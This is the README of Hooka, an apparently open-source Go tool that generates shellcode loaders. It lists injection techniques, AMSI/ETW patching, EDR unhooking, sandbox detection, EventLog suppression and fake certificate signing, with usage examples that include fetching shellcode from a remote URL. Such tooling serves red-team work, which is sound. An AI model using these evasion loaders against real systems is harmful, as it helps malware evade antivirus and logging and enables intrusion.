<p align="center">
  <h1 align="center">Hooka</h1>
  <h4 align="center">Shellcode loader generator with multiples features</h4>
  <h6 align="center">Coded with 💙 by D3Ext</h6>
</p>

<p align="center">

  <a href="https://opensource.org/licenses/MIT">
    <img src="https://img.shields.io/badge/license-MIT-_red.svg">
  </a>

  <a href="https://github.com/D3Ext/Hooka/blob/main/CHANGELOG.md">
    <img src="https://img.shields.io/badge/maintained%3F-yes-brightgreen.svg">
  </a>

  <a href="https://github.com/D3Ext/go-recon/issues">
    <img src="https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat">
  </a>

</p>

<p align="center">
  <a href="#introduction">Introduction</a> •
  <a href="#features">Features</a> •
  <a href="#usage">Usage</a> •
  <a href="#library">Library</a> •
  <a href="#disclaimer">Disclaimer</a>
</p>

# Introduction

Hooka is able to generate shellcode loaders with multiple capabilities. It is also based on other tools like [BokuLoader](https://github.com/boku7/BokuLoader), [Freeze](https://github.com/optiv/Freeze) or [Shhhloader](https://github.com/icyguider/Shhhloader), and it tries to implement more evasion features. Why in Golang? Why not?

# Features

This tool is able to generate loaders with this features:

- Multiple shellcode injection techniques:
  - SuspendedProcess
  - ProcessHollowing
  - NtCreateThreadEx
  - EtwpCreateEtwThread
  - NtQueueApcThreadEx
  - No-RWX

- Get shellcode from raw file, PE, DLL or from a URL
- EXE and DLL are supported as output loader formats

- Encrypt shellcode using:
  - AES
  - 3DES
  - RC4
  - XOR

- AMSI and ETW patching (enabled by default)
- Random variables and function names
- Shikata Ga Nai obfuscation (see [here](https://github.com/EgeBalci/sgn))
- Multiple ways to detect sandboxing
- Enable ACG Guard protection
- Block non-Microsoft signed DLLs from injecting into created processes

- Capable of unhooking user-mode hooks via multiple techniques:
  - Classic
  - Full DLL
  - Perun's Fart technique

- ***Phant0m*** technique to suspend EventLog threads (see [here](https://github.com/hlldz/Phant0m))
- Windows API hashing (see [here](https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware))
- Sign shellcode loader with fake or real certificates
- Strings obfuscation via Caesar cipher (see [here](https://en.wikipedia.org/wiki/Caesar_cipher))
- Compress code weight using Golang compile and UPX (if it's installed)
- Compute binary entropy of the loader
- Compute MD5, SHA1 and SHA256 checksums to keep track of the loader

# Installation

Just clone the repository like this:

```sh
git clone https://github.com/D3Ext/Hooka
cd Hooka
make
```

After that you will find the binary under the `build/` folder

# Usage

> Help panel
```
  _   _                   _              _
 | | | |   ___     ___   | | __   __ _  | |
 | |_| |  / _ \   / _ \  | |/ /  / _` | | |
 |  _  | | (_) | | (_) | |   <  | (_| | |_|
 |_| |_|  \___/   \___/  |_|\_\  \__,_| (_)

Usage of Hooka:
  REQUIRED:
    -i, --input string        payload to inject in raw format, as PE, as DLL or from a URL
    -o, --output string       name of output file (i.e. loader.exe)
    -f, --format string       format of the payload to generate (available: exe, dll) (default exe)

  EXECUTION:
    --proc string      process to spawn (in suspended state) when needed for given execution technique (default notepad.exe)
    --exec string      technique used to load shellcode (default "SuspendedProcess"):
                         SuspendedProcess
                         ProcessHollowing
                         NtCreateThreadEx
                         EtwpCreateEtwThread
                         NtQueueApcThreadEx
                         No-RWX

  AUXILIARY:
    -a, --arch string       architecture of the loader to generate (default amd64)
    -c, --cert string       certificate to sign generated loader with (i.e. cert.pfx)
    -d, --domain string     domain used to sign loader (i.e. www.microsoft.com)

  ENCODING:
    --enc string         encrypts shellcode using given algorithm (available: aes, 3des, rc4, xor) (default none)
    --sgn                use Shikata Ga Nai to encode generated loader (it must be installed on path)
    --strings            obfuscate strings using Caesar cipher

  EVASION:
    --unhook string       unhooking technique to use (available: full, peruns)
    --sandbox             enable sandbox evasion
    --no-amsi             don't patch AMSI
    --no-etw              don't patch ETW
    --hashing             use hashes to retrieve function pointers
    --acg                 enable ACG Guard to prevent AV/EDR from modifying existing executable code
    --blockdlls           prevent non-Microsoft signed DLLs from injecting in child processes
    --phantom             suspend EventLog threads using Phant0m technique. High privileges needed, otherwise loader skips this step
    --sleep               delay shellcode execution using a custom sleep function

  EXTRA:
    --calc              use a calc.exe shellcode to test loader capabilities (don't provide input file)
    --compress          compress generated loader using Golang compiler and UPX if it's installed
    -r, --rand          use a random set of parameters to create a random loader (just for testing purposes)
    -v, --verbose       enable verbose to print extra information
    -h, --help          print help panel

Examples:
  hooka -i shellcode.bin -o loader.exe
  hooka -i http://192.168.1.126/shellcode.bin -o loader.exe
  hooka -i shellcode.bin -o loader.exe --exec NtCreateThreadEx --unhook full --sleep 60 --acg
  hooka -i shellcode.bin -o loader.dll --domain www.domain.com --enc aes --verbose
```

> Generate a simple EXE loader
```sh
$ hooka_linux_amd64 -i shellcode.bin -o loader.exe
```

> Generate a DLL loader
```sh
$ hooka_linux_amd64 -i shellcode.bin -o loader.dll -f dll
```

> Use custom config (various examples)
```sh
$ hooka_linux_amd64 -i shellcode.bin -o loader.exe --hashing --agc --sleep --verbose
$ hooka_linux_amd64 -i shellcode.bin -o loader.exe --exec ProcessHollowing --sgn --strings --blockdlls
$ hooka_linux_amd64 -i http://xx.xx.xx.xx/shellcode.bin --sandbox --sleep --domain www.microsoft.com --verbose
```

# Demo

<img src="https://raw.githubusercontent.com/D3Ext/Hooka/main/assets/demo1.png">

<img src="https://raw.githubusercontent.com/D3Ext/Hooka/main/assets/demo2.png">

# TODO

- Add direct and indirect syscall
- Add Chacha20 cypher to encrypt shellcode
- More OPSEC features
- General improvement

# Library

The official Golang package has most of the already mentioned features and some others. To make use of it, see [here](https://github.com/D3Ext/Hooka/tree/main/examples) and [here](https://github.com/D3Ext/Hooka/tree/main/pkg/hooka)

# References

You can take a look at some of the mentioned techniques here:

```
https://github.com/C-Sto/BananaPhone
https://github.com/timwhitez/Doge-Gabh
https://github.com/Ne0nd0g/go-shellcode
https://github.com/optiv/Freeze
https://github.com/f1zm0/acheron
https://github.com/Enelg52/OffensiveGo
https://github.com/trickster0/TartarusGate
https://github.com/Kara-4search/HookDetection_CSharp
https://github.com/RedLectroid/APIunhooker
https://github.com/plackyhacker/Peruns-Fart
https://github.com/rasta-mouse/TikiTorch
https://github.com/phra/PEzor
https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet
https://github.com/chvancooten/maldev-for-dummies
https://blog.sektor7.net/#!res/2021/perunsfart.md
https://teamhydra.blog/2020/09/18/implementing-direct-syscalls-using-hells-gate/
https://www.ired.team/offensive-security/defense-evasion/detecting-hooked-syscall-functions#checking-for-hooks
https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++
https://www.ired.team/offensive-security/defense-evasion/retrieving-ntdll-syscall-stubs-at-run-time
https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware
https://winternl.com/detecting-manual-syscalls-from-user-mode/
```

# Disclaimer

Use this project under your own responsability! The author is not responsible of any bad usage of the project.

# License

This project is under [MIT](https://github.com/D3Ext/Hooka/blob/main/LICENSE) license

Copyright © 2024, *D3Ext*



